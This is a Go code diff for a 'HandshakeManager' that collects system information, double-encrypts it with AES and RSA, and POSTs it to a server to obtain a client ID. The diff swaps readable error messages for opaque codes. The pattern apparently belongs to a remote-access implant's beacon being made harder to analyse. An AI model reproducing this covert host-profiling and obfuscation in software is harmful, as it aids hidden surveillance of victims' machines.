@@ -30,13 +30,13 @@ func (hm *HandshakeManager) PerformHandshake() error {
 	// Step 1: Collect fresh system info with new seed
 	sysInfoReport, err := CollectSystemInfo(hm.initialClientID) // Use initial client ID
 	if err != nil {
-		return fmt.Errorf("failed to collect system information: %v", err)
+		return fmt.Errorf(ErrCtx(E19, err.Error()))
 	}
 
 	// Step 2: Convert to JSON
 	jsonOutput, err := sysInfoReport.ToJSON()
 	if err != nil {
-		return fmt.Errorf("failed to convert to JSON: %v", err)
+		return fmt.Errorf(ErrCtx(E18, err.Error()))
 	}
 
 	// Step 3: Double encrypt the JSON (AES + RSA)
@@ -46,7 +46,7 @@ func (hm *HandshakeManager) PerformHandshake() error {
 		hm.decryptedValues["Public Key"],
 	)
 	if err != nil {
-		return fmt.Errorf("failed to encrypt handshake data: %v", err)
+		return fmt.Errorf(ErrCtx(E19, err.Error()))
 	}
 
 	// Step 4: Build POST URL with initial clientID
@@ -65,7 +65,7 @@ func (hm *HandshakeManager) PerformHandshake() error {
 	// Step 5: Send handshake and get new client ID
 	newClientID, err := sendInitialPost(postURL, encryptedJSON, hm.decryptedValues)
 	if err != nil {
-		return fmt.Errorf("failed to send handshake: %v", err)
+		return fmt.Errorf(ErrCtx(E12, err.Error()))
 	}
 
 	//log.Printf("Handshake successful - New Client ID: %s", newClientID)
@@ -122,7 +122,7 @@ func (hm *HandshakeManager) RefreshHandshake() error {
 		// On error, ensure we restore old client ID
 		hm.currentClientID = oldClientID
 		clientID = oldClientID
-		return fmt.Errorf("refresh handshake failed: %v", err)
+		return fmt.Errorf(ErrCtx(E12, err.Error()))
 	}
 
 	return nil
